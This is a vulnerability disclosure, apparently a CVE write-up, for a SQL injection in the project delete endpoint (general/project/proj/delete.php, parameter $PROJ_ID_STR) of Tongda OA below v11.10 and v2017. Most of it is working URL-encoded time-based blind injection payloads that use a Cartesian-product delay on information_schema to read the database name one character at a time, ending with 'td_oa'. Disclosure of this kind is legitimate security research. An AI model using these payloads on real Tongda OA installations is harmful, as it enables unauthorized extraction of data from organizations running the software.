SQL injection vulnerability exists in Tongda OA

version:Versions below v11.10 and v2017

1.
Route: general/project/proj/delete.php

There is an injected parameter: $PROJ_ID_STR

The code here is very concise. When $PROJ_ID_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![image](https://github.com/Bobjones7/cve/assets/127505769/65055ecb-68a6-46cc-ade4-47f289c10bbe)

2.Payload

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/Bobjones7/cve/assets/127505769/0f9216da-934f-495a-a417-8579938ab250)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

The third digit is the character _

```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

The fourth digit is the character o

```
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
The fifth digit is the character a
```
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/Bobjones7/cve/assets/127505769/0e4769e2-01ce-4c40-81d6-7d822630c9e1)

Then through blind injection, you can determine that the database name is: td_oa


